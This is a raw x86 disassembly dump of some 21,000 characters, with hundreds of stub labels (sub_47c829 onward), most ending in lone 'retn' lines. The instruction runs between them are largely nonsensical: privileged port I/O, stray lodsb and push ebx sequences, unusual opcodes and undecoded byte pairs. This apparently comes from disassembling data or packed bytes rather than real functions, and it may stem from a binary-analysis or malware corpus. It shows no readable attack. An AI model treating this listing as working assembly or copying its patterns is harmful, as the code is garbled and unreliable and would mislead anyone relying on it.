lodsb [ esi ]
add eax 0x3fba043f
adc dl [ ebx + 0x53 ]
retn
sub_47c829
retn
sub_47c82a
retn
sub_47c82b
retn
sub_47c82c
retn
sub_47c82d
retn
sub_47c82e
retn
sub_47c82f
retn
sub_47c830
retn
sub_47c831
retn
sub_47c832
shr [ esi ] cl
inc ebx
push ecx
mov edx 0x53534941
retn
sub_47c83c
retn
sub_47c83d
retn
sub_47c83e
add eax [ eax ]
mov edx 0x53536401
retn
sub_47c846
retn
sub_47c847
retn
sub_47c848
retn
sub_47c849
retn
sub_47c84a
cmp [ eax ] esi
xor eax 0xd88916da
xchg edx eax
mov edx 0x53535d26
retn
sub_47c858
retn
sub_47c859
retn
sub_47c85a
retn
sub_47c85b
retn
sub_47c85c
retn
sub_47c85d
retn
sub_47c85e
retn
sub_47c894
retn
sub_47c895
retn
sub_47c896
retn
sub_47c897
lodsb [ esi ]
mov [ es : 0x42c2bb04 ] eax
push ebx
push ebx
mov edx 0x535374c5
xor eax 0x60b50eda
mov [ 0xffffffffd8bb0eda ] dh
mov [ 0xffffffffd8bf0eda ] esi
mov bh [ edx + 0x535319b2 ]
retn
sub_47c8bd
retn
sub_47c8be
mov ebx 0xacaca9c3
rcl [ edi - 0x46cc91a1 ] 0x1
push ebx
push ebx
pop esp
aam 0xca
adc edx [ ebx + 0x53 ]
mov edx 0x535313dd
retn
sub_47c8d7
retn
sub_47c8d8
retn
sub_47c8d9
retn
sub_47c8da
retn
sub_47c8db
retn
sub_47c8dc
retn
sub_47c8dd
retn
sub_47c8de
retn
sub_47c8df
retn
sub_47c8e0
retn
sub_47c8e1
retn
sub_47c8e2
retn
sub_47c8e3
retn
sub_47c8e4
retn
sub_47c8e5
retn
sub_47c8e6
retn
sub_47c8e7
retn
sub_47c8e8
lodsb [ esi ]
add eax 0xa307ba6f
lodsb [ esi ]
lodsb [ esi ]
add eax [ ebx ]
add eax [ eax ]
lodsb [ esi ]
inc esp
mov edx 0x53537624
retn
sub_47c8fc
retn
sub_47c8fd
retn
sub_47c8fe
retn
sub_47c8ff
retn
sub_47c900
retn
sub_47c901
retn
sub_47c902
retn
sub_47c903
retn
sub_47c904
retn
sub_47c905
retn
sub_47c906
retn
sub_47c907
retn
sub_47c908
retn
sub_47c909
retn
sub_47c90a
retn
sub_47c90b
retn
sub_47c90c
retn
sub_47c90d
retn
sub_47c90e
retn
sub_47c90f
retn
sub_47c910
retn
sub_47c911
retn
sub_47c912
retn
sub_47c913
retn
sub_47c914
retn
sub_47c915
retn
sub_47c916
or bh [ ecx ]
sub dh [ 0xffffffffd88716da ]
xchg ebp eax
xor eax 0xd88516da
nop
mov edx 0xacaca458
retn
sub_47c92b
cmp [ ebx - 0x46 ] esi
fsub [ ebp - 0x3c3c5354 ]
cmp edx [ ebx + 0x63 ]
push ebx
push ebx
cmp edx [ ebx + 0x43 ]
push ebx
push ebx
add [ edx + 0x535369f2 ] bh
retn
sub_47c945
retn
sub_47c946
retn
sub_47c947
retn
sub_47c948
retn
sub_47c949
retn
sub_47c94a
retn
sub_47c94b
retn
sub_47c94c
retn
sub_47c94d
retn
sub_47c94e
add [ 0xffffffffba5b6a35 ] al
sbb eax [ eax + 0x53 ]
push ebx
retn
sub_47c959
retn
sub_47c95a
retn
sub_47c95b
retn
sub_47c95c
pushad
xchg ebx eax
mov edx 0xacacbd64
pop esp
xlat
mov [ ecx + 0x533bacac ] ch
pop ebx
push ebx
push ebx
mov edx 0x53536eea
retn
sub_47c974
retn
sub_47c975
lodsb [ esi ]
pop edi
fcom [ esi ]
pop ebx
lodsb [ esi ]
add esi [ edi ]
pushad
0x536cceba 0xc353
retn
sub_47c987
retn
sub_47c988
retn
sub_47c989
retn
sub_47c98a
retn
sub_47c98b
retn
sub_47c98c
retn
sub_47c98d
retn
sub_47c98e
retn
sub_47c98f
retn
sub_47c990
retn
sub_47c991
or al 0x39
xor eax 0xd88d16da
xchg esp eax
xor eax 0xbab316da
mov esp 0xc3acaca3
retn
sub_47c9a5
retn
sub_47c9a6
retn
sub_47c9a7
retn
sub_47c9a8
retn
sub_47c9a9
retn
sub_47c9aa
retn
sub_47c9ab
fcom [ edx + 0x537b68ba ]
push ebx
mov ebx 0x535370d3
or cl [ edx ]
fsubr [ ebx + 0x536c6aba ]
push ebx
retn
sub_47c9c1
retn
sub_47c9c2
retn
sub_47c9c3
cmp [ edi ] ecx
fcom [ ebp - 0x5354a846 ]
lodsb [ esi ]
retn
sub_47c9cd
retn
sub_47c9ce
retn
sub_47c9cf
retn
sub_47c9d0
cmp [ ecx ] esp
fcom [ ebp + esi + 0xb4716da ]
cmp [ ecx + ecx ] edi
cmp [ eax ] esi
xor eax 0xd84516da
xchg ecx eax
xor eax 0xba4b16da
sbb eax 0xd8535341
push ss
stosd [ edi ]
mov edx 0x5353507c
retn
sub_47c9f6
retn
sub_47ca0c
retn
sub_47ca0d
retn
sub_47ca0e
retn
sub_47ca0f
mov edx 0x53535a2e
retn
sub_47ca15
retn
sub_47ca16
retn
sub_47ca17
retn
sub_47ca18
retn
sub_47ca39
mov edx 0x535345b8
pop esp
xlat
bound ebp [ esp + ebp * 4 - 0x566d4454 ]
lodsb [ esi ]
lodsb [ esi ]
fsub [ ebx + 0x531a3aba ]
push ebx
retn
sub_47ca51
mov ebx 0x53537449
ficom [ esi ]
lodsb [ esi ]
add edi [ edx + 0x5353673b ]
retn
sub_47ca60
retn
sub_47ca61
retn
sub_47ca62
or edi [ ecx ]
xor eax 0xab16da35
or edi [ ecx ]
jge r-xdata
mov edx 0xacaca406
retn
ficom [ esi ]
test eax 0xbe0aba0b
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47ca77
retn
sub_47ca96
add eax 0x5057339
add eax 0xa807d6de
lodsb [ esi ]
lodsb [ esi ]
mov edx 0xacaca406
retn
sub_47cab2
retn
sub_47cab3
retn
sub_47cab4
retn
sub_47cab5
retn
sub_47cab6
retn
sub_47cade
retn
sub_47cadf
retn
sub_47cae0
fisubr [ esi ]
mov ebx esi
fsubrp st3
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
mov ebx 0xacaca7a9
mov edx 0x535310c0
retn
sub_47caf4
cmp edx [ ebx + 0xe329b6 ]
mov edx 0x53535b30
retn
sub_47cb00
retn
sub_47cb01
retn
sub_47cb3a
retn
sub_47cb3b
retn
sub_47cb3c
retn
sub_47cb3d
retn
sub_47cb3e
retn
sub_47cb3f
retn
sub_47cb40
retn
sub_47cb41
cmp esp [ edx - 0x53ecc5b2 ]
in eax 0x97
push ebx
push ebx
push ebx
fsubr [ ebp - 0x5351c746 ]
lodsb [ esi ]
retn
sub_47cb54
retn
sub_47cb55
ficom [ esi ]
lsl ebx eax
xchg ebp eax
mov ebx 0x535348d4
or bh [ edx + 0x53536fbd ]
retn
sub_47cb67
retn
sub_47cb68
retn
sub_47cb69
retn
sub_47cb6a
mov ebx 0x5353482b
or dl dh
xchg ebx eax
mov edx 0xacacadf1
retn
sub_47cb78
retn
sub_47cb79
retn
sub_47cb7a
retn
sub_47cb7b
retn
sub_47cb7c
push 0x6ef8baa3
push ebx
push ebx
retn
sub_47cb84
push es
fdivr [ edi + 0x517fbfd2 ]
push ebx
push ebx
cmp [ ecx - 0x46 ] ebp
out 0x5a al
push ebx
push ebx
retn
sub_47cb95
retn
sub_47cb96
retn
sub_47cb97
push es
mov edx 0x5353173d
0xc3c3c390 0xc3c3
fcomp [ esi ]
inc edi
mov ebx 0x53534d8e
ficom [ esi ]
inc ebx
mov edx 0x53535c14
retn
sub_47cbb5
retn
sub_47cbb6
retn
sub_47cbb7
ficom [ esi ]
jecxz r-xdata
lodsb [ esi ]
lodsb [ esi ]
lodsb [ esi ]
add eax [ 0xffffffffacad9dba ]
lodsb [ esi ]
retn
fcomp st6
aaa
sub_47cbc9
retn
sub_47cbca
retn
sub_47cbcb
retn
sub_47cbcc
retn
sub_47cbcd
retn
sub_47cbce
retn
sub_47cbcf
retn
sub_47cbd0
retn
sub_47cbd1
ficom [ esi ]
xchg ebx eax
add edi [ edx - 0x53535c9b ]
retn
sub_47cbdb
retn
sub_47cbdc
retn
sub_47cbff
retn
sub_47cc00
retn
sub_47cc01
retn
sub_47cc02
retn
sub_47cc03
retn
sub_47cc04
retn
sub_47cc05
retn
sub_47cc06
retn
sub_47cc07
retn
sub_47cc08
cmp [ ebx ] ebp
fcomp [ ebx + 0x771eda35 ]
or bh [ ecx ]
and eax ebx
mov bh [ edx + 0x535369f4 ]
retn
sub_47cc1b
retn
sub_47cc1c
retn
sub_47cc1d
retn
sub_47cc1e
retn
sub_47cc1f
retn
sub_47cc20
fcom [ esi ]
cmpsd [ esi ] [ edi ]
ficom [ esi ]
mov edi 0x81609360
ficom [ esi ]
scasd [ edi ]
fcomp [ esi ]
scasd [ edi ]
fsubr [ edi ]
fidiv [ edi + 0x536a52ba ]
push ebx
retn
sub_47cc3a
retn
sub_47cc3b
retn
sub_47cc3c
retn
sub_47cc3d
aaa
fcom [ edx - 0x28 ]
adc ebx [ ebx - 0x26 ]
push ss
scasd [ edi ]
mov edx 0xacacb980
retn
sub_47cc4c
retn
sub_47cc4d
retn
sub_47cc4e
retn
sub_47cc4f
retn
sub_47cc50
retn
sub_47cc51
retn
sub_47cc52
retn
sub_47cc53
retn
sub_47cc7f
retn
sub_47cc80
retn
sub_47cc81
retn
sub_47cc82
retn
sub_47cc83
retn
sub_47cc84
retn
sub_47cc85
retn
sub_47cc86
retn
sub_47cc87
retn
sub_47cc88
pop esp
xlat
fwait
arpl [ ebx + 0x53 ] dx
mov edx 0x53537317
add al 0xba
div [ edi + 0x53 ]
push ebx
retn
sub_47cced
retn
sub_47ccee
retn
sub_47ccef
retn
sub_47ccf0
retn
sub_47ccf1
retn
sub_47ccf2
retn
sub_47ccf3
retn
sub_47ccf4
retn
sub_47ccf5
retn
sub_47ccf6
retn
sub_47ccf7
retn
sub_47ccf8
retn
sub_47ccf9
retn
sub_47ccfa
retn
sub_47ccfb
retn
sub_47ccfc
sar [ edi + 0x53535163 ] cl
add [ 0x53517fed ] al
push ebx
pushad
mov [ 0x534ae7ba ] al
push ebx
retn
sub_47cd12
retn
sub_47cd13
retn
sub_47cd14
mov ebx 0x53537856
push eax
xchg ebx eax
add edi [ edx + 0x535313e2 ]
retn
sub_47cd22
retn
sub_47cd23
retn
sub_47cd24
ficom [ esi ]
mov edi 0xdaa716d8
push ss
mov [ 0xffffffff81609360 ] eax
ficom [ esi ]
scasd [ edi ]
mov edx 0x53534fee
retn
sub_47cd3a
retn
sub_47cd3b
retn
sub_47cd3c
retn
sub_47cd3d
retn
sub_47cd3e
retn
sub_47cd3f
retn
sub_47cd40
retn
sub_47cd41
retn
sub_47cd42
retn
sub_47cd43
retn
sub_47cd44
retn
sub_47cd45
retn
sub_47cd46
retn
sub_47cd47
rcl [ ebx - 0x54e925b9 ] 0x1
mov edx 0x535357c3
retn
sub_47cd53
retn
sub_47cd54
fcomp st6
xrstor [ esp + ebp * 4 - 0x457945fd ]
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47cd61
retn
sub_47cd62
retn
sub_47cd63
retn
sub_47cd64
retn
sub_47cd65
retn
sub_47cd66
retn
sub_47cd67
retn
sub_47cd68
retn
sub_47cd69
retn
sub_47cd6a
retn
sub_47cd6b
retn
sub_47cd6c
retn
sub_47cd6d
retn
sub_47cd6e
retn
sub_47cd6f
retn
sub_47cd70
retn
sub_47ce47
retn
sub_47ce48
retn
sub_47ce49
pop esp
fst [ eax + 0x53 ]
push ebx
push ebx
pushad
xchg ebx eax
adc edx [ eax - 0x3c3c3c3d ]
retn
sub_47ce58
retn
sub_47ce59
retn
sub_47ce5a
retn
sub_47ce5b
retn
sub_47ce5c
retn
sub_47ce5d
retn
sub_47ce5e
retn
sub_47ce5f
retn
sub_47ce60
retn
sub_47ce61
retn
sub_47ce62
retn
sub_47ce63
retn
sub_47ce64
retn
sub_47ce65
retn
sub_47ce66
retn
sub_47ce67
retn
sub_47ce68
retn
sub_47ce69
retn
sub_47ce6a
lodsb [ esi ]
add eax 0x55b1ba27
push ebx
push ebx
retn
sub_47ce73
retn
sub_47ce74
retn
sub_47ce75
retn
sub_47ce76
retn
sub_47ce77
retn
sub_47ce78
retn
sub_47ce79
retn
sub_47ce7b
retn
sub_47ce7c
retn
sub_47ce7d
retn
sub_47ce7e
retn
sub_47ce7f
retn
sub_47ce80
retn
sub_47ce81
or bh [ edx + 0x53535245 ]
retn
sub_47ce93
mov edx 0x53531795
retn
sub_47ce99
retn
sub_47ce9a
retn
sub_47ce9b
xor eax 0xb7116da
mov edx 0xacacae30
pushad
xchg ebx eax
or al 0xd
mov edx 0x5353456e
retn
sub_47ceaf
retn
sub_47ceb0
retn
sub_47ceb1
retn
sub_47ceb2
retn
sub_47ceb3
retn
sub_47ceb4
retn
sub_47ceb5
retn
sub_47ceb6
retn
sub_47ceb7
retn
sub_47ceb8
retn
sub_47ceb9
retn
sub_47ceba
rcl [ edx - 0x5a29caaf ] 0x1
mov edx 0x53536910
retn
sub_47cec6
retn
sub_47cec7
retn
sub_47cec8
retn
sub_47cec9
xor eax 0xcbb2eda
mov edx 0x535355ad
retn
sub_47ced4
retn
sub_47ced5
retn
sub_47ced6
retn
sub_47ced7
retn
sub_47ced8
or edi [ edx + 0x5353530e ]
retn
sub_47cf1a
out dx al
xchg [ esi + 0x5acacac ] ebp
inc ebx
mov edx 0x535348ee
retn
sub_47cf28
retn
sub_47cf29
retn
sub_47cf2a
retn
sub_47cf2b
retn
sub_47cf2c
retn
sub_47cf3f
push ecx
push ebx
push ebx
retn
sub_47cf43
retn
sub_47cf44
retn
sub_47cf48
fbstp [ edi - 0x31 ]
push ebx
push ebx
push ebx
add bl dh
pop ds
ja r-xdata
retn
add bh [ edx + 0x53536760 ]
retn
sub_47cf5a
retn
sub_47cf5b
retn
sub_47cf5c
push es
fdivr [ edi - 0x53513446 ]
lodsb [ esi ]
cmp edi [ eax ]
add eax 0x16ba63e3
push ebx
push ebx
push ebx
retn
sub_47cf6f
retn
sub_47cf70
retn
sub_47cf71
retn
sub_47cf72
retn
sub_47cf73
retn
sub_47cf74
retn
sub_47cf75
xor eax 0xbaab1eda
int 0x70
push ebx
push ebx
retn
sub_47cf7f
retn
sub_47cf80
retn
sub_47cf99
retn
sub_47cf9a
retn
sub_47cf9b
retn
sub_47cf9c
retn
sub_47cf9d
ficom [ esi ]
mov bh 0xba
pop eax
push ebx
push ebx
retn
sub_47cfa6
retn
sub_47cfa7
retn
sub_47cfd6
retn
sub_47cfd7
retn
sub_47cfd8
retn
sub_47cfd9
retn
sub_47cfda
retn
sub_47cfdb
retn
sub_47cfdc
retn
sub_47cfdd
retn
sub_47cfde
retn
sub_47cfdf
retn
sub_47cfe0
retn
sub_47cfe1
retn
sub_47cff1
retn
sub_47cff2
retn
sub_47cff3
retn
sub_47cff4
retn
sub_47cff5
retn
sub_47d003
mov ebx 0xacaca59f
cmp esp [ edx ]
add eax 0xda0063e3
push ebp
mov ebx 0xacaca5ec
mov edx 0xacacac19
retn
sub_47d01b
retn
sub_47d01c
retn
sub_47d01d
retn
sub_47d052
retn
sub_47d053
retn
sub_47d054
retn
sub_47d055
retn
sub_47d056
retn
sub_47d057
retn
sub_47d058
retn
sub_47d059
retn
sub_47d05a
retn
sub_47d05b
retn
sub_47d05c
retn
sub_47d05d
retn
sub_47d05e
retn
sub_47d05f
retn
sub_47d060
retn
sub_47d061
fcom [ edx + 0x534909ba ]
push ebx
retn
sub_47d069
retn
sub_47d06a
retn
sub_47d06b
add eax [ eax ]
lodsb [ esi ]
add al 0x47
mov edx 0x53536263
retn
sub_47d0af
retn
sub_47d0b0
retn
sub_47d0b1
retn
sub_47d0b2
retn
sub_47d0b3
cmp [ esi + 0xb8d16da ] edi
cmp [ 0xffffffffb316da35 ] edi
or edi [ ecx ]
xor eax 0xbb116da
cmp [ edx ] ebx
xor eax 0xbb716da
cmp [ edi ] esi
xor eax 0xbb516da
cmp [ esi ] esi
xor eax 0xbbb16da
mov edx 0x53537451
retn
sub_47d0e3
retn
sub_47d0e4
retn
sub_47d0e5
retn
sub_47d0e6
retn
sub_47d0e7
retn
sub_47d0e8
retn
sub_47d0e9
fsubr [ ecx - 0x45815630 ]
lodsb [ esi ]
jae r-xdata
retn
push ebx
fcom [ ebp + 0x5348baba ]
push ebx
retn
sub_47d0fb
retn
sub_47d0fc
retn
sub_47d0fd
retn
sub_47d0fe
retn
sub_47d0ff
retn
sub_47d100
cmp [ esi ] esi
or edi [ edx + 0x535343dc ]
cmp [ edi ] esi
xor eax 0xa831eda
cmp [ esi + 0xa811eda ] esp
cmp [ edi ] esp
mov edx 0x53537757
cmp [ ebx + 0x5 ] edx
mov ebx 0xacaca921
mov edx 0xacacbb90
retn
sub_47d141
retn
sub_47d142
retn
sub_47d143
retn
sub_47d144
retn
sub_47d146
retn
sub_47d147
retn
sub_47d148
retn
sub_47d149
retn
sub_47d14a
retn
sub_47d14b
rcl [ edi - 0x582a25b5 ] 0x1
push ebx
push ebx
push ebx
cmp esi esi
0xbb0446d7 0xa626
sub_47d15d
lodsb [ esi ]
lodsb [ esi ]
or cl [ edx ]
salc
xchg ebx eax
mov edx 0xacacb4e0
retn
sub_47d169
retn
sub_47d16a
retn
sub_47d16b
retn
sub_47d16c
retn
sub_47d16d
retn
sub_47d16e
xor eax 0xc992eda
cmp [ ecx ] edx
mov edx 0x5353650f
retn
sub_47d1a0
mov edx 0x53536f75
retn
sub_47d1a6
retn
sub_47d1a7
retn
sub_47d1a8
retn
sub_47d1a9
retn
sub_47d1aa
retn
sub_47d1ab
retn
sub_47d1ac
retn
sub_47d1ad
retn
sub_47d1ae
retn
sub_47d1af
retn
sub_47d1b0
retn
sub_47d1d6
retn
sub_47d1d7
retn
sub_47d1d8
retn
sub_47d1d9
retn
sub_47d1da
retn
sub_47d1db
retn
sub_47d1dc
retn
sub_47d1dd
retn
sub_47d1de
retn
sub_47d1df
fcom [ esi ]
stosd [ edi ]
ficomp [ esi ]
mov bl 0x2
mov edx 0x53534dd3
retn
sub_47d1ec
add [ 0xffffffffd8b91eda ] esi
fwait
xor eax 0xabf1eda
cmp [ ebx ] ecx
xor eax 0xba716da
mov edx 0x53536bec
retn
sub_47d205
retn
sub_47d206
retn
sub_47d207
shr [ edx - 0x1229a39f ] 0x1
pop eax
push ebx
push ebx
fcomp [ ebx ]
pop ebx
fcom [ edx + edi * 4 + 0x53536a9b ]
retn
sub_47d21b
retn
sub_47d21c
retn
sub_47d21d
retn
sub_47d21e
xor eax 0xba116da
cmp [ edx ] edi
xor eax 0xbaa716da
aas
mov ah 0xac
lodsb [ esi ]
retn
sub_47d22f
retn
sub_47d230
retn
sub_47d231
retn
sub_47d232
retn
sub_47d233
retn
sub_47d234
fiadd [ esi ]
inc ebx
mov edx 0x53535a6f
retn
sub_47d23d
retn
sub_47d23e
retn
sub_47d23f
retn
sub_47d25e
push ebx
push ebx
push ebx
mov ebx 0x53534c59
mov edx 0x535370e6
retn
sub_47d26c
retn
sub_47d26d
retn
sub_47d26e
retn
sub_47d26f
retn
sub_47d270
retn
sub_47d271
retn
sub_47d272
pop esp
shl [ edi + 0x7f ] 0x1
push ebx
push ebx
fcomp [ esi ]
scasd [ edi ]
rcl [ edx - 0x5e4545b9 ] 0x1
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47d284
retn
sub_47d285
mov edx 0x53534e86
retn
sub_47d290
push ebx
push ebx
push ebx
pop esp
int1
fimul [ esi ]
scasd [ edi ]
ficomp [ esi ]
cmpsd [ esi ] [ edi ]
mov edx 0x53534bf3
retn
sub_47d2a1
retn
sub_47d2a2
retn
sub_47d2a3
retn
sub_47d2a4
0xc3c3c390 0xc3c3
retn
sub_47d2ac
retn
sub_47d2ad
retn
sub_47d2ae
retn
sub_47d2af
retn
sub_47d2b0
retn
sub_47d2b1
retn
sub_47d2b2
retn
sub_47d2b3
retn
sub_47d2b4
retn
sub_47d2b5
retn
sub_47d2b6
retn
sub_47d2b7
retn
sub_47d339
retn
sub_47d33a
retn
sub_47d33b
retn
sub_47d33c
salc
xchg ebx eax
mov edx 0x53534a12
retn
sub_47d344
retn
sub_47d345
retn
sub_47d346
retn
sub_47d347
push es
mov edx 0x53536a10
retn
sub_47d34e
retn
sub_47d34f
retn
sub_47d350
shr ch cl
out dx eax
push ebx
push ebx
push ebx
cmpsd [ esi ] [ edi ]
push edx
push ebx
push ebx
mov edx 0xacaca0b6
retn
sub_47d360
retn
sub_47d361
retn
sub_47d364
lahf
push ebx
push ebx
push ebx
mov edx 0x535361de
retn
sub_47d36e
retn
sub_47d36f
retn
sub_47d370
retn
sub_47d371
retn
sub_47d372
retn
sub_47d373
lodsb [ esi ]
les esp [ edi + 0xc535353 ]
or eax 0xc3909a08
retn
sub_47d380
retn
sub_47d381
retn
sub_47d382
retn
sub_47d383
retn
sub_47d384
retn
sub_47d385
cmp ebx [ ebx + 0x51 ]
push ebx
push ebx
mov edx 0x53536f5d
retn
sub_47d390
retn
sub_47d391
pushad
xchg ebx eax
adc ebx [ edx - 0x3c3c3c70 ]
retn
sub_47d39a
retn
sub_47d3bb
push cs
nop
retn
sub_47d3be
retn
sub_47d3bf
retn
sub_47d3c0
retn
sub_47d3c1
retn
sub_47d3c2
retn
sub_47d3c3
retn
sub_47d3c4
retn
sub_47d3c5
xor eax 0x39ad0eda
mov edx 0x535358c6
retn
sub_47d3d1
retn
sub_47d3d2
retn
sub_47d3d3
retn
sub_47d3d4
retn
sub_47d3d5
retn
sub_47d3d6
retn
sub_47d3d7
xor eax 0xbbb11eda
push esp
inc eax
push ebx
push ebx
or bh [ edx + 0x535377c3 ]
retn
sub_47d40b
retn
sub_47d40c
retn
sub_47d40d
retn
sub_47d40e
xor eax 0x53426fd0
mov edx 0x53536458
retn
sub_47d48f
retn
sub_47d490
retn
sub_47d491
retn
sub_47d492
retn
sub_47d493
retn
sub_47d494
retn
sub_47d495
retn
sub_47d496
add ch dl
arpl [ ebx + 0x53 ] dx
push ebx
aaa
fcom [ edx - 0x28 ]
adc ebx [ edi - 0x28 ]
adc ebx [ edi - 0x46 ]
add al 0xb5
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47d4ab
retn
sub_47d4ac
retn
sub_47d4ff
retn
sub_47d500
retn
sub_47d501
retn
sub_47d502
retn
sub_47d503
retn
sub_47d504
retn
sub_47d505
retn
sub_47d506
retn
sub_47d50e
clc
mov ebx 0xc3c3acac
retn
sub_47d515
push 0x96d75c90
stosd [ edi ]
lodsb [ esi ]
lodsb [ esi ]
mov edx 0x53535a32
retn
sub_47d523
retn
sub_47d524
retn
sub_47d525
retn
sub_47d526
retn
sub_47d527
retn
sub_47d528
retn
sub_47d529
or bh [ ebx + 0x53535244 ]
shr [ ebx - 0x7a28a3ae ] 0x1
mov ah 0xac
lodsb [ esi ]
pushad
lodsb [ esi ]
push 0x2f
ja r-xdata
retn
mov edx 0xacacac97
retn
sub_47d544
retn
sub_47d545
retn
sub_47d546
retn
sub_47d547
retn
sub_47d548
retn
sub_47d549
or edi [ ecx ]
or [ edx + 0x535347c4 ] edi
retn
sub_47d552
retn
sub_47d553
retn
sub_47d580
retn
sub_47d581
retn
sub_47d582
retn
sub_47d583
retn
sub_47d584
retn
sub_47d585
retn
sub_47d586
retn
sub_47d587
pop esp
salc
xor [ ebp + 0x53 ] ebx
push ebx
mov edx 0x53535d05
retn
sub_47d593
retn
sub_47d594
retn
sub_47d595
retn
sub_47d596
retn
sub_47d597
retn
sub_47d598
retn
sub_47d599
xchg edx eax
mov esp 0xba9c5051
adc al 0x53
push ebx
push ebx
retn
sub_47d5a6
retn
sub_47d5a7
retn
sub_47d5a8
retn
sub_47d5a9
retn
sub_47d5aa
retn
sub_47d5ab
retn
sub_47d5ac
retn
sub_47d5ad
retn
sub_47d5ae
retn
sub_47d5af
retn
sub_47d5b0
retn
sub_47d5b1
retn
sub_47d5b2
retn
sub_47d5b3
retn
sub_47d5b4
adc ecx [ eax + ecx ]
0xc3c3c390 0x5cc3
salc
and [ edx + 0x53 ] ebp
push ebx
ficom [ esi ]
out dx eax
mov edx 0xacacb57c
retn
sub_47d5e9
retn
sub_47d5ff
retn
sub_47d600
retn
sub_47d601
retn
sub_47d602
retn
sub_47d603
retn
sub_47d604
retn
sub_47d605
retn
sub_47d606
retn
sub_47d607
retn
sub_47d608
retn
sub_47d609
retn
sub_47d60a
retn
sub_47d60b
retn
sub_47d60c
retn
sub_47d60e
retn
sub_47d60f
retn
sub_47d610
retn
sub_47d611
retn
sub_47d612
retn
sub_47d613
mov edx 0xacaca56f
retn
sub_47d619
retn
sub_47d61a
shr [ eax - 0x4ade45a6 ] 0x1
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47d623
add edi [ edx - 0x53534ca7 ]
retn
sub_47d62b
retn
sub_47d62c
retn
sub_47d62d
retn
sub_47d62e
retn
sub_47d636
mov edx 0x53537d30
retn
sub_47d63c
retn
sub_47d63d
retn
sub_47d640
mov edx 0xacacabbb
retn
sub_47d646
push es
mov edx 0x53535f1f
add ebx eax
xchg ebp eax
mov ebx 0x5353645f
mov edx 0x53535cf2
retn
sub_47d65a
retn
sub_47d65b
retn
sub_47d65c
retn
sub_47d65d
retn
sub_47d65e
retn
sub_47d65f
retn
sub_47d660
retn
sub_47d661
retn
sub_47d662
retn
sub_47d663
retn
sub_47d664
retn
sub_47d685
mov edx 0x53535365
retn
sub_47d68b
retn
sub_47d68c
mov edx 0x535367f0
retn
sub_47d692
retn
sub_47d693
retn
sub_47d694
retn
sub_47d695
retn
sub_47d696
retn
sub_47d697
retn
sub_47d699
retn
sub_47d69a
retn
sub_47d69b
retn
sub_47d6b6
retn
sub_47d6b7
retn
sub_47d6b8
retn
sub_47d6b9
retn
sub_47d6ba
retn
sub_47d6bb
retn
sub_47d6bc
retn
sub_47d6bd
retn
sub_47d6be
retn
sub_47d6bf
retn
sub_47d6c0
xchg esp eax
push ss
scasd [ edi ]
push edx
push ebx
push ebx
push ebx
mov edx 0x53534d64
xor eax 0xb8f16da
cmp [ ebp - 0x46 ] edi
0xc3acaca1 0xc3c3
sub_47d6db
retn
sub_47d6dc
retn
sub_47d6dd
retn
sub_47d6de
retn
sub_47d6df
retn
sub_47d6e0
retn
sub_47d6e1
retn
sub_47d6e2
retn
sub_47d6e3
push 0xb7fdbaa0
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47d6eb
retn
sub_47d6ec
retn
sub_47d6ed
retn
sub_47d6f8
fsubrp st3
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
mov ebx 0xacacbbb5
salc
xchg ebx eax
mov edx 0xacacb527
retn
sub_47d70a
retn
sub_47d70b
retn
sub_47d70c
retn
sub_47d70d
retn
sub_47d70e
rcl [ edi + 0x7becba43 ] 0x1
push ebx
push ebx
retn
sub_47d717
retn
sub_47d718
retn
sub_47d719
retn
sub_47d71a
cmp [ 0x537476ba ] esi
push ebx
retn
sub_47d722
retn
sub_47d723
push es
fdivr [ edi + 0x5103bfd2 ]
push ebx
push ebx
add al 0x39
and [ edx ] cl
cmp [ edx ] esi
fcom [ edx - 0x5348d346 ]
lodsb [ esi ]
retn
sub_47d73a
retn
sub_47d73b
retn
sub_47d73c
retn
sub_47d73d
retn
sub_47d73e
retn
sub_47d73f
retn
sub_47d740
retn
sub_47d741
retn
sub_47d76e
retn
sub_47d76f
retn
sub_47d770
retn
sub_47d771
pop esp
salc
scasb [ edi ]
push bx
push ebx
mov edx 0x53536b40
retn
sub_47d77d
retn
sub_47d77e
retn
sub_47d77f
pop esp
salc
shr [ edi + 0x5baacac ] cl
mov al [ 0xffffffffdac3acac ]
aad 0xb3
push ebx
push ebx
push ebx
mov ebx 0xacacbc6d
mov edx 0xacacbd3d
retn
sub_47d79c
add eax [ eax ]
add [ ecx ] bh
push edi
add [ eax ] al
add dh bl
salc
shr [ esi - 0x45fc5354 ] cl
dec edx
inc ebx
push ebx
push ebx
retn
sub_47d7b1
retn
sub_47d7b2
retn
sub_47d7b3
retn
sub_47d7b4
retn
sub_47d7b5
add edi [ edx - 0x53534bc6 ]
retn
sub_47d7bc
retn
sub_47d7bd
retn
sub_47d7be
retn
sub_47d7bf
retn
sub_47d7c0
retn
sub_47d7c1
pop esp
xlat
xor edi [ edx + 0x53 ]
push ebx
add eax 0xa278a3d8
rcl [ edx + 0x42e45c51 ] 0x1
mov edx 0x53537a11
retn
sub_47d7d8
retn
sub_47d7d9
add [ eax ] al
mov edx 0x535361d2
pop esp
xlat
dec eax
outsd
push ebx
push ebx
mov edx 0x53536adc
retn
sub_47d7ec
retn
sub_47d7ed
retn
sub_47d7ee
retn
sub_47d7ef
retn
sub_47d7f0
retn
sub_47d7f1
retn
sub_47d7f2
retn
sub_47d7f3
retn
sub_47d7f4
retn
sub_47d7f5
retn
sub_47d7f6
retn
sub_47d7f7
retn
sub_47d7f8
retn
sub_47d7f9
retn
sub_47d7fa
retn
sub_47d7fb
retn
sub_47d7fc
retn
sub_47d7fd
retn
sub_47d7fe
retn
sub_47d7ff
retn
sub_47d800
retn
sub_47d801
retn
sub_47d816
retn
sub_47d817
retn
sub_47d818
retn
sub_47d819
retn
sub_47d81a
retn
sub_47d81b
pushad
xchg ebx eax
mov edx 0xacacb465
mov edx 0x53537e3b
retn
sub_47d828
retn
sub_47d829
retn
sub_47d82a
retn
sub_47d82b
retn
sub_47d82c
add ebx eax
push ss
pop ebx
mov ebx 0x53535de1
or bl [ edx - 0x3c3c3c70 ]
retn
sub_47d83c
retn
sub_47d83f
call [ ebx + 0x53 ]
push ebx
ficom [ esi ]
pop ss
add ebx eax
xchg ebp eax
mov edx 0xacaca04f
